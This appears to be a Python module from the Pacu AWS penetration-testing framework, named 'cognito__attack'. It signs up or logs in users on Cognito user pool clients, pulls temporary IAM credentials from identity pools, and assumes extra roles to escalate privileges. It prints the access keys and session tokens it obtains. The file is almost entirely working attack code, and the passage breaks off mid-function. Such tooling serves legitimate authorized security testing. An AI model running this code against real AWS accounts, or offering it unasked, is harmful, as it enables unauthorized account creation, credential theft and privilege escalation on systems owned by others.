import re
import base64
import webbrowser
import qrcode
import argparse
import json
from pycognito.aws_srp import AWSSRP
from dataclasses import dataclass
from typing import List, Dict, Optional
from pycognito.exceptions import SoftwareTokenMFAChallengeException
from copy import deepcopy
from botocore.exceptions import ClientError
from pacu import Main
from botocore.client import BaseClient

# Using Spencer's iam_enum.py as a template

module_info = {
    # Name of the module (should be the same as the filename)
    "name": "cognito__attack",
    # Name and any other notes about the author
    "author": "David Kutz-Marks of Rhino Security Labs",
    # Category of the module. Make sure the name matches an existing category.
    "category": "EXPLOIT",
    # One liner description of the module functionality. This shows up when a user searches for modules.
    "one_liner": "Attacks user pool clients and identity pools by creating users and exploiting misconfigurations.",
    # Description about what the module does and how it works
    "description": (
        "Attempts to retrieve IAM credentials from identity pools, create (or log in) a Cognito "
        "user with each user pool client, search and modify custom user attributes, assume extra "
        "user roles, and obtain IAM credentials at each step to facilitate privilege escalation. A "
        "standard attack on an external AWS account requires four arguments: username, password, and "
        "user pool client or identity pool (ideally both). An attack on the current Pacu session's AWS "
        "account requires two arguments: username and password. If no other arguments are specified, "
        "cognito__enum will first be run to populate the Cognito database."
    ),
    # A list of AWS services that the module utilizes during its execution
    "services": ["cognito-idp", "cognito-identity"],
    # For prerequisite modules, try and see if any existing modules return the data that is
    # required for your module before writing that code yourself; that way, session data can stay separated and modular.
    "prerequisite_modules": ["cognito__enum"],
    # External resources that the module depends on. Valid options are either a GitHub URL (must end in .git) or single file URL.
    "external_dependencies": [],
    # Module arguments to autocomplete when the user hits tab
    "arguments_to_autocomplete": [
        "--regions",
        "--user_pools",
        "--user_pool_clients",
        "--identity_pools",
        "--email",
        "--username",
        "--password",
        "--user_attributes",
    ],
}


parser = argparse.ArgumentParser(add_help=False, description=module_info["description"])
parser.add_argument(
    "--email",
    required=False,
    default=False,
    action="store",
    help="Email address to receive verification code (not always needed; this is sometimes sent to username).",
)
parser.add_argument(
    "--regions",
    required=False,
    default=None,
    help=(
        "Region(s) to target. Defaults to region(s) indicated in other arguments, "
        "and to Pacu Cognito database regions if none is found. Standard format (e.g. us-west-2)."
    ),
)
parser.add_argument(
    "--user_pools",
    required=False,
    default=False,
    action="store",
    help=(
        "User pool(s) to target. This will attempt to list their user pool clients and "
        "target them also. Defaults to user pools indicated in user pool clients argument, "
        "and to all session user pools if none is found. Standard format of REGION_GUID (e.g. us-west-2_uS2erhWzQ)."
    ),
)
parser.add_argument(
    "--user_pool_clients",
    required=False,
    default=False,
    action="store",
    help=(
        "User pool client(s) to target. Defaults to all session user pool clients. "
        "Format: ClientID@UserPoolID (e.g. 1june8@us-west-2_uS2erhWzQ)."
    ),
)
parser.add_argument(
    "--identity_pools",
    required=False,
    default=False,
    action="store",
    help=(
        "Identity pool(s) to target. Defaults to all session identity pools."
        "Standard format of 'REGION:GUID' and requires the single quotes due to colon "
        "(e.g. 'us-east-1:7dbbvc22-b905-4d75-9b2a-54ade5132076')."
    ),
)
parser.add_argument(
    "--username",
    required=False,
    default=False,
    action="store",
    help="Username for sign-up or login. Defaults to testuser.",
)
parser.add_argument(
    "--password",
    required=False,
    default=False,
    action="store",
    help="Password for sign-up or login. Defaults to TesPas808@!.",
)
parser.add_argument(
    "--user_attributes",
    required=False,
    default=[],
    action="store",
    help=(
        "User attributes for sign-up. "
        'Format: \'[{"Name":"given_name","Value":"lorem"},{"Name":"custom:access","Value":"admin"}]\''
    ),
)


ARG_FIELD_MAPPER = {
    "email": "Email",
    "user_pool_clients": "UserPoolClients",
    "user_pools": "UserPools",
    "identity_pools": "IdentityPools",
    "username": "Username",
    "password": "Password",
}


@dataclass
class SignUpResponse:
    username: Optional[str] = None
    is_new_user: bool = True


def _verify_user(
    client: BaseClient, username: str, up_client: dict, all_new_regions: list
):
    tokens = verify(
        client,
        username,
        up_client["ClientId"],
        up_client["UserPoolId"],
        up_client["Region"],
    )
    all_new_regions.append(up_client["Region"])

    return tokens


def _authenticate_user(
    aws: AWSSRP,
    client: BaseClient,
    username: str,
    up_client: Dict,
    all_new_regions: List,
):
    try_again = True

    while try_again:
        try:
            return aws.authenticate_user()
        except ClientError as e:
            error_response = e.response["Error"]
            if error_response["Code"] == "UserNotConfirmedException":
                print("User already exists, but not confirmed. Please verify first.")

                choice = input("Send new confirmation code? (y/n): ")
                if choice.lower() in ["y", "yes"]:
                    client.resend_confirmation_code(
                        ClientId=up_client["ClientId"], Username=username
                    )

                _verify_user(client, username, up_client, all_new_regions)
            else:
                print(f"An unexpected error occurred: {error_response}")
                try_again = False

            user_input = input("Do you want to try again? (y/n): ")
            try_again = user_input.lower() in ["y", "yes"]


def main(args, pacu_main: Main):
    attack_users = []
    all_new_regions = []
    attack_user_pool_clients = []
    cognito_identity_pools = []
    identity_pool = ""
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    print = pacu_main.print
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions

    up_clients = []

    if args.username is False:
        args.username = "testuser"

    if args.password is False:
        args.password = "TesPas808@!"

    if not args.user_pools and not args.user_pool_clients and not args.identity_pools:
        if not args.regions:
            regions = get_regions("cognito-idp")
            if regions is None or regions == [] or regions == "" or regions == {}:
                print(
                    "This module is not supported in any regions specified in the current session's region set. Exiting..."
                )
                return
            else:
                print("Using all session regions: " + ", ".join(regions))
        else:
            regions = args.regions.split(",")
            print("Using regions: " + ", ".join(regions))
        print(
            "No user pools, user pool clients, or identity pools specified. Using all user pool clients in Pacu session database."
        )
        if (
            fetch_data(
                ["Cognito", "UserPools"],
                module_info["prerequisite_modules"][0],
                f"--regions {','.join(regions)}",
            )
            is False
        ):
            print("Pre-req module failed, exiting...")
            return
        if (
            fetch_data(
                ["Cognito", "UserPoolClients"],
                module_info["prerequisite_modules"][0],
                f"--regions {','.join(regions)}",
            )
            is False
        ):
            print("Pre-req module failed, exiting...")
            return
        if (
            fetch_data(
                ["Cognito", "IdentityPools"],
                module_info["prerequisite_modules"][0],
                f"--regions {','.join(regions)}",
            )
            is False
        ):
            print("Pre-req module failed, exiting...")
            return
        up_clients = [
            client
            for client in session.Cognito["UserPoolClients"]
            if client["Region"] in regions
        ]
        cognito_identity_pools = session.Cognito["IdentityPools"]

    if not args.regions:
        regions = []

    if args.identity_pools:
        cognito_identity_pools = []
        if not args.regions:
            regions = []
        for identity_pool in args.identity_pools.split(","):
            new_identity_pool = {}
            region = identity_pool.split(":")[0]
            new_identity_pool["Region"] = region
            new_identity_pool["IdentityPoolId"] = identity_pool
            identity_client = pacu_main.get_boto3_client("cognito-identity", region)
            try:
                print("Attempting unauthenticated retrieval of identity Id credentials")
                identity_id = identity_client.get_id(IdentityPoolId=identity_pool)
                identity_creds = identity_client.get_credentials_for_identity(
                    IdentityId=identity_id["IdentityId"]
                )
                if identity_creds["Credentials"]["AccessKeyId"] is not None:
                    print("Access Key ID found.")
                    print(identity_creds["Credentials"]["AccessKeyId"])
                    new_identity_pool["AccessKeyId"] = identity_creds["Credentials"][
                        "AccessKeyId"
                    ]
                if identity_creds["Credentials"]["SecretKey"] is not None:
                    print("Secret Key found.")
                    new_identity_pool["SecretKey"] = identity_creds["Credentials"][
                        "SecretKey"
                    ]
                    print(identity_creds["Credentials"]["SecretKey"])
                if identity_creds["Credentials"]["SessionToken"] is not None:
                    print("Session Token found.")
                    new_identity_pool["SessionToken"] = identity_creds["Credentials"][
                        "SessionToken"
                    ]
                    print(identity_creds["Credentials"]["SessionToken"])
                if identity_creds["Credentials"]["Expiration"] is not None:
                    print("Expiration found.")
                    new_identity_pool["Expiration"] = identity_creds["Credentials"][
                        "Expiration"
                    ]
                    print(identity_creds["Credentials"]["Expiration"])
            except ClientError as error:
                code = error.response["Error"]["Code"]
                if code == "UnauthorizedOperation":
                    print("  Access denied to GetId or GetCredentialsForIdentity.")
                else:
                    print("  " + code)
                print("  Skipping identity pool enumeration...")

            cognito_identity_pools.append(new_identity_pool)

    if args.user_pools:
        if not args.regions:
            regions = []
        for user_pool in args.user_pools.split(","):
            region = user_pool.split("_")[0]
            client = pacu_main.get_boto3_client("cognito-idp", region)
            username = None
            next_token = None
            while username is None or next_token is not None:
                if next_token is None:
                    try:
                        print(
                            f"Trying to list original user pool clients for UserPoolId: {user_pool} in region {region}"
                        )
                        username = client.list_user_pool_clients(
                            UserPoolId=user_pool, MaxResults=60
                        )

                        for user_pool_client in username["UserPoolClients"]:
                            client_info = {}
                            print("User pool client found.")
                            client_info["ClientId"] = user_pool_client["ClientId"]
                            client_info["UserPoolId"] = user_pool_client["UserPoolId"]
                            client_info["Region"] = region
                            up_clients.append(client_info)
                            attack_user_pool_clients.append(client_info)

                        if "NextToken" in username:
                            next_token = username["NextToken"]

                    except ClientError as error:
                        code = error.response["Error"]["Code"]
                        print(username)
                        print("FAILURE: ")
                        if code == "UnauthorizedOperation":
                            print("  Access denied to ListUserPoolClients.")
                            break
                        elif code == "InvalidParameterException":  # Add this block
                            print("  InvalidParameterException")
                            print(f"  UserPoolId causing the issue: {user_pool}")
                            break
                        else:
                            print("  " + code)
                        print("  Skipping user pool client enumeration...")
                        break
                else:
                    try:
                        print(
                            f"Trying to list else-block user pool clients for UserPoolId: {user_pool}"
                        )
                        username = client.list_user_pool_clients(
                            NextToken=next_token, UserPoolId=user_pool, MaxResults=60
                        )

                        for user_pool_client in username["UserPoolClients"]:
                            client_info = {}
                            print("User pool client found.")
                            client_info["ClientId"] = user_pool_client["ClientId"]
                            client_info["UserPoolId"] = user_pool_client["UserPoolId"]
                            client_info["Region"] = region
                            up_clients.append(client_info)
                            attack_user_pool_clients.append(client_info)

                    except ClientError as error:
                        code = error.response["Error"]["Code"]
                        print("FAILURE: ")
                        if code == "UnauthorizedOperation":
                            print("  Access denied to ListUserPoolClients.")
                        elif code == "InvalidParameterException":  # Add this block
                            print("  InvalidParameterException")
                            print(f"  UserPoolId causing the issue: {user_pool}")
                            break
                        else:
                            print("  " + code)
                        print("  Skipping user pool client enumeration...")
                        break

                    if "NextToken" in username:
                        print("NextToken found.")
                        next_token = username["NextToken"]
                    else:
                        print("No NextToken found.")
                        break

            print(
                f"  {len(up_clients)} user pool client(s) found in user pool {user_pool}."
            )

    if args.user_pool_clients:
        for up_client in args.user_pool_clients.split(","):
            if "@" not in up_client:
                print(
                    'ERROR: User pool client names must be in the format "ClientID@UserPoolID" (e.g. 1june8@us-west-2_uS2erhWzQ).'
                )
                return {"error": "invalid usage"}
            up_clients.append(
                {
                    "ClientId": up_client.split("@")[0],
                    "UserPoolId": up_client.split("@")[1],
                    "Region": up_client.split("@")[1].split("_")[0],
                }
            )
            attack_user_pool_clients.append(
                {
                    "ClientId": up_client.split("@")[0],
                    "UserPoolId": up_client.split("@")[1],
                    "Region": up_client.split("@")[1].split("_")[0],
                }
            )

    if isinstance(args.user_attributes, str):
        args.user_attributes = parse_user_attributes(args.user_attributes)

    for up_client in up_clients:
        print(
            "Attempting to sign up user in user pool client "
            + up_client["ClientId"]
            + " in region "
            + up_client["Region"]
            + " . . . "
        )
        attack_user = {}
        attack_user["Tokens"] = {}
        attack_user["Credentials"] = {}
        aws = []
        aws2session = ""
        qr_img = []
        tokens = []
        client = pacu_main.get_boto3_client("cognito-idp", up_client["Region"])
        identity_client = pacu_main.get_boto3_client(
            "cognito-identity", up_client["Region"]
        )
        try:
            sign_up_response = sign_up(
                client,
                args.email,
                up_client["ClientId"],
                args.username,
                args.password,
                args.user_attributes,
            )
        except Exception:
            print("User exists.")
            break

        username = sign_up_response.username

        if username is None:
            break

        if sign_up_response.is_new_user:
            _verify_user(client, username, up_client, all_new_regions)

        try:
            aws = AWSSRP(
                username=username,
                password=args.password,
                pool_id=up_client["UserPoolId"],
                client_id=up_client["ClientId"],
                client=client,
            )

            tokens = _authenticate_user(
                aws, client, username, up_client, all_new_regions
            )

            if not tokens:
                print("Authentication process failed! Aborting...")
                return

            if "AuthenticationResult" in tokens:
                print("You're signed in as " + username + "!")
                print(
                    "Your access token is: "
                    + tokens["AuthenticationResult"]["AccessToken"]
                )
                print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
                print(
                    "Your refresh token is: "
                    + tokens["AuthenticationResult"]["RefreshToken"]
                )
                print(
                    "Your token type is: " + tokens["AuthenticationResult"]["TokenType"]
                )
                attack_user["Username"] = username
                attack_user["Region"] = up_client["Region"]
                attack_user["UserPoolId"] = up_client["UserPoolId"]
                attack_user["ClientId"] = up_client["ClientId"]
                attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
                    "AccessToken"
                ]
                attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"][
                    "IdToken"
                ]
                attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
                    "RefreshToken"
                ]
                attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
                    "TokenType"
                ]
                credentials = get_identity_credentials(
                    cognito_identity_pools,
                    identity_client,
                    tokens["AuthenticationResult"]["IdToken"],
                    up_client["UserPoolId"],
                    up_client["Region"],
                )
                if credentials is not None:
                    print("Temporary credentials retrieved!")
                    print(credentials)
                    attack_user["Credentials"]["AccessKeyId"] = credentials[
                        "AccessKeyId"
                    ]
                    attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
                    attack_user["Credentials"]["SessionToken"] = credentials[
                        "SessionToken"
                    ]
                    attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
                new_tokens, new_credentials = get_custom_attributes(
                    client,
                    tokens,
                    args.password,
                    up_client["Region"],
                    up_client["ClientId"],
                    up_client["UserPoolId"],
                    cognito_identity_pools,
                    identity_client,
                    identity_pool,
                )
                attack_user["NewTokens"] = new_tokens
                attack_user["NewCredentials"] = new_credentials
                roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
                attack_user["NewRoleTokens"] = prompt_assume_roles(
                    identity_client,
                    identity_pool,
                    roles,
                    region,
                    up_client["UserPoolId"],
                    tokens["AuthenticationResult"]["IdToken"],
                )
                if attack_user["NewRoleTokens"] is not None:
                    attack_user["NewRoleCredentials"] = attack_user["NewRoleTokens"]
                attack_user_data = client.get_user(
                    AccessToken=tokens["AuthenticationResult"]["AccessToken"]
                )
                attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
                attack_users.append(attack_user)
                continue
        except SoftwareTokenMFAChallengeException as error:
            try:
                code = input(
                    "Please enter the MFA code generated by your application: "
                )
                print("Entering final MFA challenge")
                error_string = str(error)
                aws2session = re.search(r"'Session': '(.*?)'", error_string)
                if aws2session:
                    aws2sessionfinal = aws2session.group(1)
                else:
                    print("NO MATCH FOUND")
                    continue

                tokens = client.respond_to_auth_challenge(
                    ClientId=up_client["ClientId"],
                    ChallengeName="SOFTWARE_TOKEN_MFA",
                    Session=aws2sessionfinal,
                    ChallengeResponses={
                        "USERNAME": username,
                        "SOFTWARE_TOKEN_MFA_CODE": code,
                    },
                )
            except ClientError as err:
                print(err)
                continue
            print("You're signed in as " + username + "!")
            print(
                "Your access token is: " + tokens["AuthenticationResult"]["AccessToken"]
            )
            print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
            print(
                "Your refresh token is: "
                + tokens["AuthenticationResult"]["RefreshToken"]
            )
            print("Your token type is: " + tokens["AuthenticationResult"]["TokenType"])
            attack_user["Username"] = username
            attack_user["Region"] = up_client["Region"]
            attack_user["UserPoolId"] = up_client["UserPoolId"]
            attack_user["ClientId"] = up_client["ClientId"]
            attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
                "AccessToken"
            ]
            attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"]["IdToken"]
            attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
                "RefreshToken"
            ]
            attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
                "TokenType"
            ]
            credentials = get_identity_credentials(
                cognito_identity_pools,
                identity_client,
                tokens["AuthenticationResult"]["IdToken"],
                up_client["UserPoolId"],
                up_client["Region"],
            )
            if credentials is not None:
                print("Temporary credentials retrieved!")
                print(credentials)
                attack_user["Credentials"]["AccessKeyId"] = credentials["AccessKeyId"]
                attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
                attack_user["Credentials"]["SessionToken"] = credentials["SessionToken"]
                attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
            new_tokens, new_credentials = get_custom_attributes(
                client,
                tokens,
                args.password,
                up_client["Region"],
                up_client["ClientId"],
                up_client["UserPoolId"],
                cognito_identity_pools,
                identity_client,
                identity_pool,
            )
            attack_user["NewTokens"] = new_tokens
            attack_user["NewCredentials"] = new_credentials
            roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
            attack_user["NewRoleTokens"] = prompt_assume_roles(
                identity_client,
                identity_pool,
                roles,
                up_client["Region"],
                up_client["UserPoolId"],
                tokens["AuthenticationResult"]["IdToken"],
            )
            if attack_user["NewRoleTokens"] is not None:
                attack_user["NewRoleCredentials"] = attack_user["NewRoleTokens"]
            if new_tokens is None:
                attack_user_data = client.get_user(
                    AccessToken=tokens["AuthenticationResult"]["AccessToken"]
                )
                attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
                attack_users.append(attack_user)
            continue

        if tokens["ChallengeName"] == "MFA_SETUP":
            try:
                print("First, we need to set up an MFA application.")
                associate_token_response = client.associate_software_token(
                    Session=tokens["Session"]
                )
                qr_img = qrcode.make(
                    f"otpauth://totp/{username}?secret={associate_token_response['SecretCode']}"
                )
                qr_img.save("qr.png")
                print(
                    "A QR code has been generated for you. Please scan it with your MFA application."
                )
                try:
                    webbrowser.open("qr.png")
                except Exception:
                    print(
                        "Something went wrong when opening the file. Note that this cannot be done as root."
                        "Please manually open qr.png in the working directory to scan the QR code."
                    )
                    continue

                mfa_code = input(
                    "Please enter the MFA code generated by your application: "
                )
                client.verify_software_token(
                    Session=associate_token_response["Session"], UserCode=mfa_code
                )
                print("Now that an MFA application is set up, let's sign in again.")
                print(
                    "You will have to wait for a NEW MFA code to appear in your MFA application."
                )
                try:
                    aws2 = AWSSRP(
                        username=username,
                        password=args.password,
                        pool_id=up_client["UserPoolId"],
                        client_id=up_client["ClientId"],
                        client=client,
                    )
                    tokens = aws2.authenticate_user()
                except SoftwareTokenMFAChallengeException as error:
                    try:
                        code = input(
                            "Please enter the MFA code generated by your application: "
                        )
                        print("Entering final MFA challenge")
                        error_string = str(error)
                        aws2session = re.search(r"'Session': '(.*?)'", error_string)
                        if aws2session:
                            aws2sessionfinal = aws2session.group(1)
                        else:
                            print("NO MATCH FOUND")
                            continue

                        tokens = client.respond_to_auth_challenge(
                            ClientId=up_client["ClientId"],
                            ChallengeName="SOFTWARE_TOKEN_MFA",
                            Session=aws2sessionfinal,
                            ChallengeResponses={
                                "USERNAME": username,
                                "SOFTWARE_TOKEN_MFA_CODE": code,
                            },
                        )
                    except ClientError as err:
                        print(err)
                        continue
                print("You're signed in as " + username + "!")
                print(
                    "Your access token is: "
                    + tokens["AuthenticationResult"]["AccessToken"]
                )
                print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
                print(
                    "Your refresh token is: "
                    + tokens["AuthenticationResult"]["RefreshToken"]
                )
                print(
                    "Your token type is: " + tokens["AuthenticationResult"]["TokenType"]
                )
                attack_user["Username"] = username
                attack_user["Region"] = up_client["Region"]
                attack_user["UserPoolId"] = up_client["UserPoolId"]
                attack_user["ClientId"] = up_client["ClientId"]
                attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
                    "AccessToken"
                ]
                attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"][
                    "IdToken"
                ]
                attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
                    "RefreshToken"
                ]
                attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
                    "TokenType"
                ]
                credentials = get_identity_credentials(
                    cognito_identity_pools,
                    identity_client,
                    tokens["AuthenticationResult"]["IdToken"],
                    up_client["UserPoolId"],
                    up_client["Region"],
                )
                if credentials is not None:
                    print("Temporary credentials retrieved!")
                    print(credentials)
                    attack_user["Credentials"]["AccessKeyId"] = credentials[
                        "AccessKeyId"
                    ]
                    attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
                    attack_user["Credentials"]["SessionToken"] = credentials[
                        "SessionToken"
                    ]
                    attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
                new_tokens, new_credentials = get_custom_attributes(
                    client,
                    tokens,
                    args.password,
                    up_client["Region"],
                    up_client["ClientId"],
                    up_client["UserPoolId"],
                    cognito_identity_pools,
                    identity_client,
                    identity_pool,
                )
                attack_user["NewTokens"] = new_tokens
                attack_user["NewCredentials"] = new_credentials
                roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
                attack_user["NewRoleTokens"] = prompt_assume_roles(
                    identity_client,
                    identity_pool,
                    roles,
                    region,
                    up_client["UserPoolId"],
                    tokens["AuthenticationResult"]["IdToken"],
                )
                if attack_user["NewRoleTokens"] is not None:
                    print(
                        "New role tokens retrieved! Attempting to receive temporary credentials from identity pool."
                    )
                    new_role_credentials = get_identity_credentials(
                        cognito_identity_pools,
                        identity_client,
                        attack_user["NewRoleTokens"]["IdToken"],
                        up_client["UserPoolId"],
                        up_client["Region"],
                    )
                    attack_user["NewRoleCredentials"] = new_role_credentials
                if new_tokens is None:
                    attack_user_data = client.get_user(
                        AccessToken=tokens["AuthenticationResult"]["AccessToken"]
                    )
                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
                    attack_users.append(attack_user)
                if new_tokens is not None:
                    attack_user_data = client.get_user(
                        AccessToken=new_tokens["AuthenticationResult"]["AccessToken"]
                    )
                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
                    attack_users.append(attack_user)
                continue

            except ClientError as err:
                print(err)
                continue
        elif tokens["ChallengeName"] == "SOFTWARE_TOKEN_MFA":
            code = input("Please enter the MFA code generated by your application: ")
            tokens = client.verify_software_token(
                Session=associate_token_response["Session"], UserCode=mfa_code
            )
            print("You're signed in as " + username + "!")
            print(
                "Your access token is: " + tokens["AuthenticationResult"]["AccessToken"]
            )
            print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
            print(
                "Your refresh token is: "
                + tokens["AuthenticationResult"]["RefreshToken"]
            )
            print("Your token type is: " + tokens["AuthenticationResult"]["TokenType"])
            attack_user["Username"] = username
            attack_user["Region"] = up_client["Region"]
            attack_user["UserPoolId"] = up_client["UserPoolId"]
            attack_user["ClientId"] = up_client["ClientId"]
            attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
                "AccessToken"
            ]
            attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"]["IdToken"]
            attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
                "RefreshToken"
            ]
            attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
                "TokenType"
            ]
            credentials = get_identity_credentials(
                cognito_identity_pools,
                identity_client,
                tokens["AuthenticationResult"]["IdToken"],
                up_client["UserPoolId"],
                up_client["Region"],
            )
            if credentials is not None:
                print("Temporary credentials retrieved!")
                print(credentials)
                attack_user["Credentials"]["AccessKeyId"] = credentials["AccessKeyId"]
                attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
                attack_user["Credentials"]["SessionToken"] = credentials["SessionToken"]
                attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
            new_tokens, new_credentials = get_custom_attributes(
                client,
                tokens,
                args.password,
                up_client["Region"],
                up_client["ClientId"],
                up_client["UserPoolId"],
                cognito_identity_pools,
                identity_client,
                identity_pool,
            )
            attack_user["NewTokens"] = new_tokens
            attack_user["NewCredentials"] = new_credentials
            roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
            attack_user["NewRoleTokens"] = prompt_assume_roles(
                identity_client,
                identity_pool,
                roles,
                region,
                up_client["UserPoolId"],
                tokens["AuthenticationResult"]["IdToken"],
            )
            if attack_user["NewRoleTokens"] is not None:
                print(
                    "New role tokens retrieved! Attempting to receive temporary credentials from identity pool."
                )
                new_role_credentials = get_identity_credentials(
                    cognito_identity_pools,
                    identity_client,
                    attack_user["NewRoleTokens"]["IdToken"],
                    up_client["UserPoolId"],
                    up_client["Region"],
                )
                attack_user["NewRoleCredentials"] = new_role_credentials
            attack_user_data = client.get_user(
                AccessToken=tokens["AuthenticationResult"]["AccessToken"]
            )
            attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
            attack_users.append(attack_user)
            break

    if regions != []:
        print("Running cognito__enum again to add new users to Pacu database.")
        if (
            fetch_data(
                ["Cognito", "NewUsers"],
                module_info["prerequisite_modules"][0],
                f"--regions {','.join(regions)}",
            )
            is False
        ):
            print("Pre-req module second attempt failed, exiting...")

    search_string = "custom"

    choice = input("List all custom attributes for all users in all user pools (y/n)?")
    if choice.lower() == "y" and session.Cognito.get("UsersInPools", None) is not None:
        for user in session.Cognito["UsersInPools"]:
            if any(
                search_string in attribute["Name"] for attribute in user["Attributes"]
            ):
                print("Custom attribute(s) found for user" + user["Username"] + "!")
                print(user["Attributes"])

    gathered_data = {
        "Attack_UserPoolClients": attack_user_pool_clients,
        "Attack_IdentityPools": cognito_identity_pools,
        "Attack_Users": attack_users,
    }

    for var in vars(args):
        if var == "regions":
            continue
        if not getattr(args, var) and ARG_FIELD_MAPPER[var] in gathered_data:
            del gathered_data[ARG_FIELD_MAPPER[var]]

    cognito_data = deepcopy(session.Cognito)
    for key, value in gathered_data.items():
        cognito_data[key] = value
    session.update(pacu_main.database, Cognito=cognito_data)


def validate_json_data(data, schema):
    if not isinstance(data, dict):
        return False

    for key in schema["required"]:
        if key not in data:
            return False

    for key, value in data.items():
        if key in schema["properties"] and not isinstance(
            value, schema["properties"][key]["type"]
        ):
            return False

    return True


def parse_user_attributes(user_attributes: str) -> List[Dict[str, str]]:
    try:
        json_data = json.loads(user_attributes)
    except json.decoder.JSONDecodeError:
        print("Provided user attributes could not be parsed. Please check your format.")
        raise

    schema = {
        "required": ["Name", "Value"],
        "properties": {"Name": {"type": str}, "Value": {"type": str}},
    }

    for obj in json_data:

        if validate_json_data(obj, schema) is False:
            print("Provided user attributes are not valid. Please check your format.")
            raise

    return json_data


def sign_up(
    client,
    email: str,
    client_id: str,
    username: str,
    password: str,
    user_attributes: List[Dict[str, str]] = None,
) -> SignUpResponse:

    response = SignUpResponse(username=username)

    user_attributes = user_attributes or []
    email_exists = any(attribute["Name"] == "email" for attribute in user_attributes)

    if email and not email_exists:
        user_attributes.append({"Name": "email", "Value": email})

    try:
        client.sign_up(
            ClientId=client_id,
            Username=username,
            Password=password,
            UserAttributes=user_attributes,
        )
        print(f"Successfully signed up user {username}.")
        return response
    except client.exceptions.UsernameExistsException:
        print(f"Username {username} already exists. Attempting to log in.")
        response.is_new_user = False
        return response
    except client.exceptions.InvalidParameterException as e:
        error_message = str(e)
        print(error_message)
        if "attribute is required" in error_message:
            parameter = re.search(
                r"schema: (.*?): The attribute is required", error_message
            )
            if parameter:
                attribute_name = parameter.group(1)
                param_value = input(f"Enter value for {attribute_name}: ")
                user_attributes.append({"Name": attribute_name, "Value": param_value})
                return sign_up(
                    client, email, client_id, username, password, user_attributes
                )
        else:
            print(f"Invalid parameter: {str(e)}")
            param_name = input("Please enter the name of the invalid parameter: ")
            param_value = input("Please enter the value of the invalid parameter: ")
            if param_name.lower() in ["username", "password"]:
                return sign_up(
                    client,
                    email,
                    client_id,
                    param_name.lower() == "username" and param_value or username,
                    param_name.lower() == "password" and param_value or password,
                    user_attributes,
                )
            user_attributes.append({"Name": param_name, "Value": param_value})
            return sign_up(
                client, email, client_id, username, password, user_attributes
            )
    except Exception as e:
        print(f"Error signing up user {username}: {str(e)}")
        return SignUpResponse()


def verify(client, username, client_id, user_pool_id, region):
    prompt = (
        f"Enter verification code for user {username} in user pool client {client_id}: "
    )
    code = input(prompt)
    try:
        response = client.confirm_sign_up(
            ClientId=client_id, Username=username, ConfirmationCode=code
        )
        print(f"Successfully verified user {username}")
    except client.exceptions.UserNotFoundException:
        print(f"User {username} not found")
        return False
    except client.exceptions.CodeMismatchException:
        print(f"Invalid verification code {code}")
        return False
    except Exception as e:
        print(f"Error verifying user {username}: {str(e)}")
        return False

    return response


def get_assumable_roles(id_token):
    id_token_payload = id_token.split(".")[1]
    id_token_payload += "=" * (-len(id_token_payload) % 4)
    id_token_payload_decoded = base64.b64decode(id_token_payload)
    id_token_payload_json = json.loads(id_token_payload_decoded)
    roles = id_token_payload_json.get("cognito:roles", [])
    print("This user can assume the following roles:" + str(roles))
    return roles


def prompt_assume_roles(
    identity_client, identity_pool, roles, region, user_pool_id, id_token
):
    for i, role in enumerate(roles):
        print(f"{i + 1}. {role}")
    choice = input('Enter the number of the role you want to assume (or "n" to skip): ')
    if choice.lower() == "n":
        return False
    try:
        index = int(choice) - 1
        if 0 <= index < len(roles):
            logins = {
                "cognito-idp." + region + ".amazonaws.com/" + user_pool_id: id_token
            }
            identity_id = identity_client.get_id(IdentityPoolId=identity_pool)
            new_role = identity_client.get_credentials_for_identity(
                IdentityId=identity_id["IdentityId"],
                Logins=logins,
                CustomRoleArn=roles[index],
            )
            print("Assumed role successfully.")
            if new_role["Credentials"]["AccessKeyId"] is not None:
                print("Access Key ID found.")
                print(new_role["Credentials"]["AccessKeyId"])
            if new_role["Credentials"]["SecretKey"] is not None:
                print("Secret Key found.")
                print(new_role["Credentials"]["SecretKey"])
            if new_role["Credentials"]["SessionToken"] is not None:
                print("Session Token found.")
                print(new_role["Credentials"]["SessionToken"])
            if new_role["Credentials"]["Expiration"] is not None:
                print("Expiration found.")
                print(new_role["Credentials"]["Expiration"])
            return new_role
        else:
            print("Invalid choice.")
            return False
    except ValueError:
        print("Invalid choice.")
        return False


def get_custom_attributes(
    client,
    tokens,
    att_password,
